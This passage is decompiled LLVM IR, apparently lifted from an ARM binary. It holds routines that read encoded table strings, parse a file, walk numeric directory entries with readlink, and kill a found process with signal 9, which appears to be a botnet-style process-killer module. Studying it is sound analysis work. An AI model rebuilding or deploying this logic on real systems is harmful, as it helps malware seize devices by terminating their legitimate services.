  %v2_dea8 = load i8, i8* %v1_dea8, align 1
  %v3_dea8 = zext i8 %v2_dea8 to i32
  %v1_deac = add i32 %v0_dec0, 1
  %v2_deac = inttoptr i32 %v1_deac to i8*
  %v3_deac = load i8, i8* %v2_deac, align 1
  %v4_deac = zext i8 %v3_deac to i32
  %v1_deb0 = add nsw i32 %v0_deb0, -2
  %v4_deb4 = mul nuw nsw i32 %v4_deac, 256
  %v5_deb4 = or i32 %v4_deb4, %v3_dea8
  %v2_debc = add i32 %v5_deb4, %v0_debc
  %v1_dec0 = add i32 %v0_dec0, 2
  store i32 %v1_dec0, i32* @r1, align 4
  %v8_dec4 = icmp sgt i32 %v1_deb0, 1
  br i1 %v8_dec4, label %dec_label_pc_dea8, label %dec_label_pc_dec8

dec_label_pc_dec8:                                ; preds = %dec_label_pc_dea8, %dec_label_pc_de80
  %v1_ded0 = phi i32 [ 0, %dec_label_pc_de80 ], [ %v2_debc, %dec_label_pc_dea8 ]
  %v0_dec8 = phi i32 [ %arg3, %dec_label_pc_de80 ], [ %v1_deb0, %dec_label_pc_dea8 ]
  %v7_dec8 = icmp eq i32 %v0_dec8, 1
  br i1 %v7_dec8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dec8
  %v1_decc = load i32, i32* @r1, align 4
  %v2_decc = inttoptr i32 %v1_decc to i8*
  %v3_decc = load i8, i8* %v2_decc, align 1
  %v4_decc = zext i8 %v3_decc to i32
  %v3_ded0 = add i32 %v4_decc, %v1_ded0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dec8, %bb
  %v0_def4 = phi i32 [ %v1_ded0, %dec_label_pc_dec8 ], [ %v3_ded0, %bb ]
  %v3_ded8 = urem i32 %v2_de98, 65536
  %v1_dee0 = add i32 %arg1, 9
  %v2_dee0 = inttoptr i32 %v1_dee0 to i8*
  %v3_dee0 = load i8, i8* %v2_dee0, align 1
  %v4_dee0 = zext i8 %v3_dee0 to i32
  %v3_dee4 = urem i32 %v5_de98, 65536
  %v4_dee8 = udiv i32 %v2_de98, 65536
  %v3_def0 = mul nuw nsw i32 %v4_dee0, 256
  %v4_def4 = udiv i32 %v5_de98, 65536
  %v5_def4 = add i32 %v0_def4, %v4_def4
  %v2_def8 = add i32 %v5_def4, %v3_def0
  %v5_dee8 = add nuw nsw i32 %v3_ded8, %v3_de90
  %v2_deec = add nuw nsw i32 %v5_dee8, %v4_dee8
  %v2_defc = add nuw nsw i32 %v2_deec, %v3_dee4
  %v2_df00 = add i32 %v2_def8, %v2_defc
  %tmp = icmp ult i32 %v2_df00, 65536
  br i1 %tmp, label %dec_label_pc_df20, label %dec_label_pc_df0c

dec_label_pc_df0c:                                ; preds = %.thread, %dec_label_pc_df0c
  %v2_df141 = phi i32 [ %v2_df14, %dec_label_pc_df0c ], [ %v2_df00, %.thread ]
  %v3_df182.in = phi i32 [ %v2_df14, %dec_label_pc_df0c ], [ %v2_df00, %.thread ]
  %v3_df182 = udiv i32 %v3_df182.in, 65536
  %v3_df10 = urem i32 %v2_df141, 65536
  %v2_df14 = add nuw nsw i32 %v3_df10, %v3_df182
  %tmp14 = icmp ult i32 %v2_df14, 65536
  br i1 %tmp14, label %dec_label_pc_df20.loopexit, label %dec_label_pc_df0c

dec_label_pc_df20.loopexit:                       ; preds = %dec_label_pc_df0c
  br label %dec_label_pc_df20

dec_label_pc_df20:                                ; preds = %dec_label_pc_df20.loopexit, %.thread
  %v0_df20 = phi i32 [ %v2_df14, %dec_label_pc_df20.loopexit ], [ %v2_df00, %.thread ]
  %v1_df20 = urem i32 %v0_df20, 65536
  %v3_df28 = xor i32 %v1_df20, 65535
  ret i32 %v3_df28

; uselistorder directives
  uselistorder i32 %v2_df14, { 2, 1, 3, 0 }
  uselistorder i32 %v2_df00, { 3, 0, 2, 1 }
  uselistorder i32 %v1_ded0, { 1, 0 }
  uselistorder i32 %v1_dec0, { 1, 0 }
  uselistorder i32 %v1_deb0, { 0, 2, 1 }
  uselistorder i32 %v0_dec0, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_df0c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_dea8, { 1, 0 }
}

define i32 @function_df30(i32 %arg1) local_unnamed_addr {
dec_label_pc_df30:
  %v2_df34 = load i32, i32* @global_var_1a71c.116, align 4
  %v2_df3c = call i32 @kill(i32 %v2_df34, i32 9)
  %v0_df40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_df40, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_df30
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_df30, %bb
  ret i32 %v2_df3c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_df44(i32 %arg1) local_unnamed_addr {
dec_label_pc_df44:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_df44 = load i32, i32* @r4, align 4
  store i32 %v3_df44, i32* %stack_var_-36, align 4
  %v6_df44 = load i32, i32* @r5, align 4
  %v9_df44 = load i32, i32* @r6, align 4
  %v12_df44 = load i32, i32* @r7, align 4
  %v15_df44 = load i32, i32* @r8, align 4
  %v21_df44 = load i32, i32* @sl, align 4
  %v2_df58 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_df58, i32* @sl, align 4
  %v3_df60 = mul i32 %arg1, 65536
  store i32 %v3_df60, i32* @r5, align 4
  %v2_df6c = ptrtoint i32* %stack_var_-8773 to i32
  %v4_df78 = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_df8c = load i32, i32* @r5, align 4
  %v3_df8c = udiv i32 %v0_df8c, 65536
  store i32 %v3_df8c, i32* %r4.global-to-local, align 4
  %v4_df90 = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_df94 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_df94, i32* @r6, align 4
  %v1_df9c = mul nuw nsw i32 %v3_df8c, 256
  %v3_dfa8 = and i32 %v1_df9c, 65280
  store i32 %v3_dfa8, i32* %r4.global-to-local, align 4
  %v2_dfb0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_dfb0, i32* %sb.global-to-local, align 4
  %v3_dfb4 = bitcast i8* %stack_var_-581 to i32*
  %v4_dfb4 = call i32* @memset(i32* %v3_dfb4, i32 0, i32 513)
  %v2_dfb8 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_dfb8, i32* %sb.global-to-local, align 4
  %v0_dfc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_dfc0 = load i32, i32* @r5, align 4
  %v4_dfc0 = udiv i32 %v1_dfc0, 16777216
  %v5_dfc0 = or i32 %v4_dfc0, %v0_dfc0
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_dfe0 = trunc i32 %v5_dfc0 to i8
  %v4_dfe0 = call i32 @function_11e40(i8 %v3_dfe0, i32 16, i32 %v2_dfb8)
  %v2_dfe8 = call i32 @function_119dc(i8* nonnull %stack_var_-68)
  %v7_dfec = icmp eq i32 %v2_dfe8, 2
  br i1 %v7_dfec, label %dec_label_pc_e4b4, label %dec_label_pc_dff4

dec_label_pc_dff4:                                ; preds = %dec_label_pc_df44, %dec_label_pc_e4b4
  %v1_dff8 = call i32 @function_11394(i32 15)
  %v1_e000 = call i32 @function_11394(i32 16)
  %v1_e008 = call i32 @function_11394(i32 17)
  %v1_e010 = call i32 @function_11394(i32 19)
  %v0_e014 = load i32, i32* @r4, align 4
  %v2_e01c = inttoptr i32 %v0_e014 to i32*
  %v3_e01c = call i32 @function_112b0(i32 19, i32* %v2_e01c)
  %v4_e01c = inttoptr i32 %v3_e01c to i8*
  %v0_e020 = load i32, i32* @r4, align 4
  %v4_e024 = call i32 (i8*, i32, ...) @open(i8* %v4_e01c, i32 %v0_e020)
  %v2_e028 = icmp eq i32 %v4_e024, -1
  store i32 %v4_e024, i32* @r8, align 4
  br i1 %v2_e028, label %dec_label_pc_e450, label %dec_label_pc_e034.preheader

dec_label_pc_e034.preheader:                      ; preds = %dec_label_pc_dff4
  %v4_e04054 = call i32 @function_11c34(i32* %v3_dfb4, i32 512, i32 %v4_e024)
  %v2_e04456 = icmp eq i32 %v4_e04054, 0
  br i1 %v2_e04456, label %dec_label_pc_e1d4.loopexit, label %dec_label_pc_e04c.lr.ph

dec_label_pc_e04c.lr.ph:                          ; preds = %dec_label_pc_e034.preheader
  %v2_e094 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e04c

dec_label_pc_e04c:                                ; preds = %dec_label_pc_e04c.lr.ph, %dec_label_pc_e034.backedge
  %v3_e050 = load i8, i8* %stack_var_-581, align 1
  %v4_e050 = sext i8 %v3_e050 to i32
  %v2_e054 = icmp eq i8 %v3_e050, 0
  br i1 %v2_e054, label %bb123, label %bb

bb:                                               ; preds = %dec_label_pc_e04c
  %v8_e058 = icmp eq i8 %v3_e050, 58
  br i1 %v8_e058, label %.thread6, label %dec_label_pc_e06c

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_e084

bb123:                                            ; preds = %dec_label_pc_e04c
  br label %dec_label_pc_e084

dec_label_pc_e06c:                                ; preds = %bb
  %v1_e074.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %bb124, %dec_label_pc_e06c
  %v0_e070 = phi i32 [ %v1_e070, %bb124 ], [ 0, %dec_label_pc_e06c ]
  %v1_e070 = add i32 %v0_e070, 1
  %v2_e074 = add i32 %v1_e070, %v1_e074.pre
  %v3_e074 = inttoptr i32 %v2_e074 to i8*
  %v4_e074 = load i8, i8* %v3_e074, align 1
  %v6_e074 = zext i8 %v4_e074 to i32
  %v2_e078 = icmp eq i8 %v4_e074, 0
  br i1 %v2_e078, label %dec_label_pc_e084, label %bb124

bb124:                                            ; preds = %dec_label_pc_e070
  %v8_e07c = icmp eq i8 %v4_e074, 58
  br i1 %v8_e07c, label %dec_label_pc_e084, label %dec_label_pc_e070

dec_label_pc_e084:                                ; preds = %dec_label_pc_e070, %bb124, %bb123, %.thread6
  %v1_e0b0 = phi i32 [ 0, %.thread6 ], [ 0, %bb123 ], [ %v1_e070, %bb124 ], [ %v1_e070, %dec_label_pc_e070 ]
  %v0_e084 = phi i32 [ %v4_e050, %.thread6 ], [ %v4_e050, %bb123 ], [ %v6_e074, %bb124 ], [ %v6_e074, %dec_label_pc_e070 ]
  %v2_e084 = icmp eq i32 %v0_e084, 0
  br i1 %v2_e084, label %dec_label_pc_e034.backedge, label %dec_label_pc_e08c

dec_label_pc_e034.backedge:                       ; preds = %dec_label_pc_e084, %dec_label_pc_e15c, %dec_label_pc_e1a8, %dec_label_pc_e0d0
  %v0_e03c = load i32, i32* @r8, align 4
  %v4_e040 = call i32 @function_11c34(i32* %v3_dfb4, i32 512, i32 %v0_e03c)
  %v2_e044 = icmp eq i32 %v4_e040, 0
  br i1 %v2_e044, label %dec_label_pc_e1d4.loopexit, label %dec_label_pc_e04c

dec_label_pc_e08c:                                ; preds = %dec_label_pc_e084
  %v1_e090 = add i32 %v1_e0b0, 2
  %v2_e098 = add i32 %v1_e090, %v2_e094
  %v1_e09c = add i32 %v2_e098, -545
  %v2_e09c = inttoptr i32 %v1_e09c to i8*
  %v3_e09c = load i8, i8* %v2_e09c, align 1
  %v2_e0a0 = icmp eq i8 %v3_e09c, 0
  br i1 %v2_e0a0, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_e08c
  %v8_e0a4 = icmp eq i8 %v3_e09c, 32
  br i1 %v8_e0a4, label %.thread10, label %dec_label_pc_e0b0

.thread10:                                        ; preds = %bb125
  store i32 %v1_e090, i32* @r5, align 4
  br label %dec_label_pc_e0d0

bb126:                                            ; preds = %dec_label_pc_e08c
  store i32 %v1_e090, i32* @r5, align 4
  br label %dec_label_pc_e0d0

dec_label_pc_e0b0:                                ; preds = %bb125
  %v0_e0b0 = load i32, i32* @r6, align 4
  %v2_e0b0 = add i32 %v0_e0b0, %v1_e0b0
  br label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %bb127, %dec_label_pc_e0b0
  %v0_e0c013 = phi i32 [ %v1_e0c0, %bb127 ], [ %v2_e0b0, %dec_label_pc_e0b0 ]
  %v1_e0b4 = add i32 %v0_e0c013, 3
  %v2_e0b4 = inttoptr i32 %v1_e0b4 to i8*
  %v3_e0b4 = load i8, i8* %v2_e0b4, align 1
  %v2_e0b8 = icmp eq i8 %v3_e0b4, 0
  br i1 %v2_e0b8, label %.thread12, label %bb127

.thread12:                                        ; preds = %dec_label_pc_e0b4
  %v1_e0c014 = add i32 %v0_e0c013, 1
  br label %dec_label_pc_e0c8

bb127:                                            ; preds = %dec_label_pc_e0b4
  %v8_e0bc = icmp eq i8 %v3_e0b4, 32
  %v1_e0c0 = add i32 %v0_e0c013, 1
  br i1 %v8_e0bc, label %dec_label_pc_e0c8, label %dec_label_pc_e0b4

dec_label_pc_e0c8:                                ; preds = %bb127, %.thread12
  %v1_e0c015 = phi i32 [ %v1_e0c014, %.thread12 ], [ %v1_e0c0, %bb127 ]
  %v2_e0c8 = sub i32 %v1_e0c015, %v0_e0b0
  %v1_e0cc = add i32 %v2_e0c8, 2
  store i32 %v1_e0cc, i32* @r5, align 4
  br label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %bb126, %.thread10, %dec_label_pc_e0c8
  %v1_e0dc = phi i32 [ %v1_e090, %.thread10 ], [ %v1_e090, %bb126 ], [ %v1_e0cc, %dec_label_pc_e0c8 ]
  %v0_e0d0 = load i32, i32* @r6, align 4
  %v2_e0d0 = add i32 %v0_e0d0, %v1_e090
  store i32 %v2_e0d0, i32* @r4, align 4
  %v2_e0dc = add i32 %v1_e0dc, %v2_e094
  store i32 0, i32* @r7, align 4
  %v3_e0e8 = add i32 %v2_e0dc, -545
  %v4_e0e8 = inttoptr i32 %v3_e0e8 to i8*
  store i8 0, i8* %v4_e0e8, align 1
  %v1_e0ec = inttoptr i32 %v2_e0d0 to i8*
  %v2_e0ec = call i32 @function_119dc(i8* %v1_e0ec)
  store i32 %v2_e0ec, i32* @r1, align 4
  %v0_e0f8 = load i32, i32* @r4, align 4
  %v3_e0fc = inttoptr i32 %v0_e0f8 to i8*
  %v4_e0fc = call i32 @function_11d30(i8* %v3_e0fc, i32 %v2_e0ec, i32 %v2_dfb8)
  %v2_e100 = icmp eq i32 %v4_e0fc, -1
  br i1 %v2_e100, label %dec_label_pc_e034.backedge, label %dec_label_pc_e11c.preheader

dec_label_pc_e11c.preheader:                      ; preds = %dec_label_pc_e0d0
  %v1_e104 = load i32, i32* @r7, align 4
  %v1_e108 = load i32, i32* @r6, align 4
  %v2_e108 = load i32, i32* @r5, align 4
  %v3_e108 = add i32 %v2_e108, %v1_e108
  store i32 %v1_e104, i32* @r4, align 4
  %v1_e11c46 = add i32 %v3_e108, 2
  %v2_e11c47 = inttoptr i32 %v1_e11c46 to i8*
  %v3_e11c48 = load i8, i8* %v2_e11c47, align 1
  %v2_e12050 = icmp eq i8 %v3_e11c48, 0
  %v1_e12452 = add i32 %v2_e108, 2
  br i1 %v2_e12050, label %dec_label_pc_e15c, label %dec_label_pc_e12c

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e11c.preheader, %dec_label_pc_e11c.backedge
  %v0_e15c82 = phi i32 [ %v0_e15c81, %dec_label_pc_e11c.backedge ], [ %v1_e104, %dec_label_pc_e11c.preheader ]
  %v0_e144.pr = phi i32 [ %v0_e144.pr67, %dec_label_pc_e11c.backedge ], [ %v1_e104, %dec_label_pc_e11c.preheader ]
  %v0_e460 = phi i32 [ %v0_e46070, %dec_label_pc_e11c.backedge ], [ %v1_e104, %dec_label_pc_e11c.preheader ]
  %v0_e12478 = phi i32 [ %v1_e124, %dec_label_pc_e11c.backedge ], [ %v1_e12452, %dec_label_pc_e11c.preheader ]
  %v0_e154 = phi i32 [ %v0_e11c, %dec_label_pc_e11c.backedge ], [ %v3_e108, %dec_label_pc_e11c.preheader ]
  %v1_e130.in = phi i8 [ %v3_e11c, %dec_label_pc_e11c.backedge ], [ %v3_e11c48, %dec_label_pc_e11c.preheader ]
  %v7_e12c = icmp eq i8 %v1_e130.in, 9
  br i1 %v7_e12c, label %.thread23, label %bb128

bb128:                                            ; preds = %dec_label_pc_e12c
  %v8_e130 = icmp eq i8 %v1_e130.in, 32
  br i1 %v8_e130, label %.thread23.thread35, label %dec_label_pc_e144

.thread23.thread35:                               ; preds = %bb128
  br label %dec_label_pc_e150

.thread23:                                        ; preds = %dec_label_pc_e12c
  br label %dec_label_pc_e150

dec_label_pc_e144:                                ; preds = %bb128
  %v7_e144 = icmp eq i32 %v0_e144.pr, 1
  br i1 %v7_e144, label %dec_label_pc_e460, label %dec_label_pc_e14c

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e460, %dec_label_pc_e144
  %v0_e15075 = phi i32 [ %v1_e460, %dec_label_pc_e460 ], [ %v0_e460, %dec_label_pc_e144 ]
  br label %dec_label_pc_e150

dec_label_pc_e150:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_e14c
  %v0_e150 = phi i32 [ %v0_e460, %.thread23.thread35 ], [ %v0_e460, %.thread23 ], [ %v0_e15075, %dec_label_pc_e14c ]
  %v0_e144.pr68 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_e14c ]
  %v7_e158 = icmp sgt i32 %v0_e150, 6
  br i1 %v7_e158, label %dec_label_pc_e15c, label %dec_label_pc_e11c.backedge

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e11c.backedge, %dec_label_pc_e150, %dec_label_pc_e11c.preheader
  %v1_e1ac = phi i32 [ %v1_e12452, %dec_label_pc_e11c.preheader ], [ %v1_e124, %dec_label_pc_e11c.backedge ], [ %v0_e12478, %dec_label_pc_e150 ]
  %v0_e15c = phi i32 [ %v1_e104, %dec_label_pc_e11c.preheader ], [ %v0_e15c81, %dec_label_pc_e11c.backedge ], [ %v0_e15c82, %dec_label_pc_e150 ]
  %v2_e15c = icmp eq i32 %v0_e15c, 0
  br i1 %v2_e15c, label %dec_label_pc_e034.backedge, label %dec_label_pc_e168

dec_label_pc_e168:                                ; preds = %dec_label_pc_e15c
  %v2_e170 = add i32 %v1_e1ac, %v2_e094
  %v1_e174 = add i32 %v2_e170, -545
  %v2_e174 = inttoptr i32 %v1_e174 to i8*
  %v3_e174 = load i8, i8* %v2_e174, align 1
  %v2_e178 = icmp eq i8 %v3_e174, 0
  br i1 %v2_e178, label %dec_label_pc_e1a8, label %bb129

bb129:                                            ; preds = %dec_label_pc_e168
  %v8_e17c = icmp eq i8 %v3_e174, 32
  br i1 %v8_e17c, label %dec_label_pc_e1a8, label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %bb129
  %v2_e184 = add i32 %v1_e1ac, %v1_e108
  br label %dec_label_pc_e188

dec_label_pc_e188:                                ; preds = %bb130, %dec_label_pc_e184
  %v0_e19428 = phi i32 [ %v1_e194, %bb130 ], [ %v1_e1ac, %dec_label_pc_e184 ]
  %v0_e188 = phi i32 [ %v1_e188, %bb130 ], [ %v2_e184, %dec_label_pc_e184 ]
  %v1_e188 = add i32 %v0_e188, 1
  %v2_e188 = inttoptr i32 %v1_e188 to i8*
  %v3_e188 = load i8, i8* %v2_e188, align 1
  %v2_e18c = icmp eq i8 %v3_e188, 0
  br i1 %v2_e18c, label %.thread27, label %bb130

.thread27:                                        ; preds = %dec_label_pc_e188
  %v1_e19429 = add i32 %v0_e19428, 1
  br label %dec_label_pc_e19c

bb130:                                            ; preds = %dec_label_pc_e188
  %v8_e190 = icmp eq i8 %v3_e188, 32
  %v1_e194 = add i32 %v0_e19428, 1
  br i1 %v8_e190, label %dec_label_pc_e19c, label %dec_label_pc_e188

dec_label_pc_e19c:                                ; preds = %bb130, %.thread27
  %v1_e1a4 = phi i32 [ %v1_e19429, %.thread27 ], [ %v1_e194, %bb130 ]
  %v2_e1a4 = add i32 %v1_e1a4, %v2_e094
  br label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e168, %bb129, %dec_label_pc_e19c
  %v2_e1b4 = phi i32 [ %v2_e170, %dec_label_pc_e168 ], [ %v2_e170, %bb129 ], [ %v2_e1a4, %dec_label_pc_e19c ]
  %v2_e1ac = add i32 %v1_e1ac, %v1_e108
  store i32 %v2_e1ac, i32* @r4, align 4
  %v3_e1b4 = add i32 %v2_e1b4, -545
  %v4_e1b4 = inttoptr i32 %v3_e1b4 to i8*
  store i8 0, i8* %v4_e1b4, align 1
  %v1_e1b8 = inttoptr i32 %v2_e1ac to i8*
  %v2_e1b8 = call i32 @function_119dc(i8* %v1_e1b8)
  %v8_e1c0 = icmp sgt i32 %v2_e1b8, 15
  br i1 %v8_e1c0, label %dec_label_pc_e034.backedge, label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1a8
  %v0_e1c8 = load i32, i32* @r4, align 4
  %v2_e1cc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = bitcast i32* %stack_var_-52 to i8*
  %v3_e1d0 = call i32 @function_11a04(i8* %v2_e1d0, i32 %v0_e1c8)
  br label %dec_label_pc_e1d4

dec_label_pc_e1d4.loopexit:                       ; preds = %dec_label_pc_e034.backedge, %dec_label_pc_e034.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre92 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_e1d4

dec_label_pc_e1d4:                                ; preds = %dec_label_pc_e1d4.loopexit, %dec_label_pc_e1c4
  %v1_e1e4.pre-phi = phi i8* [ %.pre92, %dec_label_pc_e1d4.loopexit ], [ %v2_e1d0, %dec_label_pc_e1c4 ]
  %v2_e1e0.pre-phi = phi i32 [ %.pre, %dec_label_pc_e1d4.loopexit ], [ %v2_e1cc, %dec_label_pc_e1c4 ]
  %v0_e1d4 = load i32, i32* @r8, align 4
  %v1_e1d8 = call i32 @close(i32 %v0_e1d4)
  %v2_e1e4 = call i32 @function_119dc(i8* %v1_e1e4.pre-phi)
  store i32 %v2_e1e4, i32* @r4, align 4
  %v2_e1e8 = icmp eq i32 %v2_e1e4, 0
  br i1 %v2_e1e8, label %dec_label_pc_e490, label %dec_label_pc_e1f0

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e1d4
  %v3_e1f8 = call i32 @function_112b0(i32 15, i32* null)
  %v4_e1f8 = inttoptr i32 %v3_e1f8 to i8*
  %v3_e1fc = call %__dirstream* @opendir(i8* %v4_e1f8)
  %v5_e1fc = ptrtoint %__dirstream* %v3_e1fc to i32
  store i32 %v5_e1fc, i32* @r8, align 4
  %v2_e200 = icmp eq %__dirstream* %v3_e1fc, null
  br i1 %v2_e200, label %dec_label_pc_e430, label %dec_label_pc_e210.preheader

dec_label_pc_e210.preheader:                      ; preds = %dec_label_pc_e1f0
  store i32 0, i32* @r5, align 4
  %v3_e21441 = call %dirent* @readdir(%__dirstream* nonnull %v3_e1fc)
  %v2_e21844 = icmp eq %dirent* %v3_e21441, null
  br i1 %v2_e21844, label %dec_label_pc_e424, label %dec_label_pc_e220.preheader.lr.ph

dec_label_pc_e220.preheader.lr.ph:                ; preds = %dec_label_pc_e210.preheader
  %v2_e250 = bitcast i32* %stack_var_-4677 to i8*
  %tmp132 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_e220.preheader

dec_label_pc_e210.loopexit:                       ; preds = %dec_label_pc_e228, %dec_label_pc_e23c, %dec_label_pc_e2a4
  %v0_e210 = load i32, i32* @r8, align 4
  %v1_e210 = inttoptr i32 %v0_e210 to %__dirstream*
  %v3_e214 = call %dirent* @readdir(%__dirstream* %v1_e210)
  %v2_e218 = icmp eq %dirent* %v3_e214, null
  br i1 %v2_e218, label %dec_label_pc_e424, label %dec_label_pc_e220.preheader

dec_label_pc_e220.preheader:                      ; preds = %dec_label_pc_e220.preheader.lr.ph, %dec_label_pc_e210.loopexit
  %v0_e22890.in = phi %dirent* [ %v3_e21441, %dec_label_pc_e220.preheader.lr.ph ], [ %v3_e214, %dec_label_pc_e210.loopexit ]
  br label %dec_label_pc_e220

dec_label_pc_e220:                                ; preds = %dec_label_pc_e220.preheader, %dec_label_pc_e40c
  %v0_e234.in = phi %dirent* [ %v0_e22890.in, %dec_label_pc_e220.preheader ], [ %v3_e418, %dec_label_pc_e40c ]
  %v0_e220 = load i32, i32* @r5, align 4
  %v2_e220 = icmp eq i32 %v0_e220, 0
  br i1 %v2_e220, label %dec_label_pc_e228, label %dec_label_pc_e424

dec_label_pc_e228:                                ; preds = %dec_label_pc_e220
  %v0_e234 = ptrtoint %dirent* %v0_e234.in to i32
  %v1_e228 = add i32 %v0_e234, 11
  %v2_e228 = inttoptr i32 %v1_e228 to i8*
  %v3_e228 = load i8, i8* %v2_e228, align 1
  %v4_e228 = zext i8 %v3_e228 to i32
  %v1_e22c = add nsw i32 %v4_e228, -48
  store i32 %v1_e228, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_e22c, 9
  br i1 %tmp, label %dec_label_pc_e210.loopexit, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e228
  %v3_e244 = call i32 @function_112b0(i32 15, i32* null)
  store i32 %v2_df58, i32* @r0, align 4
  %v3_e250 = call i32 @function_11a04(i8* %v2_e250, i32 %v3_e244)
  %v2_e258 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e25c = load i32, i32* @r7, align 4
  %v0_e260 = load i32, i32* @sl, align 4
  %v2_e260 = add i32 %v0_e260, %v2_e258
  store i32 %v2_e260, i32* @r0, align 4
  %v2_e264 = inttoptr i32 %v2_e260 to i8*
  %v3_e264 = call i32 @function_11a04(i8* %v2_e264, i32 %v0_e25c)
  %v2_e26c = call i32 @function_119dc(i8* %v2_e250)
  %v0_e270 = load i32, i32* @r5, align 4
  store i32 %v2_e26c, i32* %r4.global-to-local, align 4
  %v2_e27c = inttoptr i32 %v0_e270 to i32*
  %v3_e27c = call i32 @function_112b0(i32 16, i32* %v2_e27c)
  %v0_e284 = load i32, i32* @sl, align 4
  %v2_e284 = add i32 %v2_e26c, %v0_e284
  store i32 %v2_e284, i32* @r0, align 4
  %v2_e288 = inttoptr i32 %v2_e284 to i8*
  %v3_e288 = call i32 @function_11a04(i8* %v2_e288, i32 %v3_e27c)
  %v7_e298 = call i32 @readlink(i8* %v2_e250, i8* %tmp132, i32 4096)
  %v2_e29c = icmp eq i32 %v7_e298, -1
  br i1 %v2_e29c, label %dec_label_pc_e210.loopexit, label %dec_label_pc_e2a4

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e23c
  %v0_e2a4 = load i32, i32* @r5, align 4
  %v2_e2ac = inttoptr i32 %v0_e2a4 to i32*
  %v3_e2ac = call i32 @function_112b0(i32 15, i32* %v2_e2ac)
  store i32 %v2_df58, i32* @r0, align 4
  %v3_e2b8 = call i32 @function_11a04(i8* %v2_e250, i32 %v3_e2ac)
  %v2_e2c0 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e2c4 = load i32, i32* @r7, align 4
  %v0_e2c8 = load i32, i32* @sl, align 4
  %v2_e2c8 = add i32 %v0_e2c8, %v2_e2c0
  store i32 %v2_e2c8, i32* @r0, align 4
  %v2_e2cc = inttoptr i32 %v2_e2c8 to i8*
  %v3_e2cc = call i32 @function_11a04(i8* %v2_e2cc, i32 %v0_e2c4)
  %v2_e2d4 = call i32 @function_119dc(i8* %v2_e250)
  %v0_e2d8 = load i32, i32* @r5, align 4
  store i32 %v2_e2d4, i32* %r4.global-to-local, align 4
  %v2_e2e4 = inttoptr i32 %v0_e2d8 to i32*
  %v3_e2e4 = call i32 @function_112b0(i32 17, i32* %v2_e2e4)
  %v0_e2ec = load i32, i32* @sl, align 4
  %v2_e2ec = add i32 %v2_e2d4, %v0_e2ec
  store i32 %v2_e2ec, i32* @r0, align 4
  %v2_e2f0 = inttoptr i32 %v2_e2ec to i8*
  %v3_e2f0 = call i32 @function_11a04(i8* %v2_e2f0, i32 %v3_e2e4)
  %v3_e2f8 = call %__dirstream* @opendir(i8* %v2_e250)
  %v5_e2f8 = ptrtoint %__dirstream* %v3_e2f8 to i32
  store i32 %v5_e2f8, i32* %sb.global-to-local, align 4
  %v2_e2fc = icmp eq %__dirstream* %v3_e2f8, null
  br i1 %v2_e2fc, label %dec_label_pc_e210.loopexit, label %dec_label_pc_e304.preheader

dec_label_pc_e304.preheader:                      ; preds = %dec_label_pc_e2a4
  %v3_e308138 = call %dirent* @readdir(%__dirstream* nonnull %v3_e2f8)
  %v5_e308139 = ptrtoint %dirent* %v3_e308138 to i32
  store i32 %v5_e308139, i32* @r6, align 4
  %v2_e30c140 = icmp eq %dirent* %v3_e308138, null
  store i32 4096, i32* @r1, align 4
  store i32 %v2_df6c, i32* @r0, align 4
  br i1 %v2_e30c140, label %dec_label_pc_e40c, label %dec_label_pc_e31cthread-pre-split

dec_label_pc_e304.loopexit:                       ; preds = %dec_label_pc_e324, %dec_label_pc_e3bc
  %v0_e304.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_e304 = inttoptr i32 %v0_e304.pre to %__dirstream*
